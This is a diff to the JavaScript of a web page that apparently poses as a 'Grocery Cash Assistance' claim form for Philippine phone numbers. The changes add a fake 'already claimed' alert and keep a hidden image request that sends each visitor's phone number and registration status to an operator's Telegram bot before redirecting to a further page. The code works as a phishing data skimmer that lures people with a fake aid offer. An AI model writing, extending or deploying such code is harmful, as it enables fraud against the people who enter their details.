@@ -212,32 +212,36 @@
         };
 
         function processStep1() {
-            const phone = document.getElementById('userPhone').value.trim();
+            const phoneInput = document.getElementById('userPhone');
+            const phone = phoneInput.value.trim();
             const regStatus = document.querySelector('input[name="reg"]:checked').value;
-            const el = document.getElementById('userPhone');
 
-            // VALIDATION FORMAT
+            // 1. VALIDATION FORMAT
             if (phone.length < 11 || !phone.startsWith('09')) {
-                el.classList.add('shake-error');
-                setTimeout(() => el.classList.remove('shake-error'), 500);
+                phoneInput.classList.add('shake-error');
+                setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
                 return;
             }
 
-            // BAN FILTER (Kukunin ang listahan mula sa config.js)
-            if (typeof BANNED_NUMBERS !== 'undefined' && BANNED_NUMBERS.includes(phone)) {
-                alert("This number is not eligible for verification.");
-                el.classList.add('shake-error');
-                el.value = "";
+            // 2. CHECK IF ALREADY CLAIMED (From config.js)
+            if (typeof CLAIMED_NUMBERS !== 'undefined' && CLAIMED_NUMBERS.includes(phone)) {
+                alert("This number ( " + phone + " ) has already successfully claimed the Grocery Cash Assistance (GCA). Limit reached.");
+                phoneInput.classList.add('shake-error');
+                phoneInput.value = ""; 
+                setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
+                
+                // I-notify pa rin ang Telegram para sa security log
+                const logMsg = `⚠️ DUPLICATE CLAIM ATTEMPT:\n📱 Number: ${phone}\nStatus: Blocked (Claimed)`;
+                new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(logMsg)}`;
                 return;
             }
 
-            // TELEGRAM NOTIFICATION
+            // 3. TELEGRAM NOTIFICATION (Proceeding)
             const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
             new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
 
             if(BYPASS_MODE) {
                 setTimeout(() => {
-                    // Pupunta sa main.html
                     window.location.href = "main.html";
                 }, 800);
             } else {
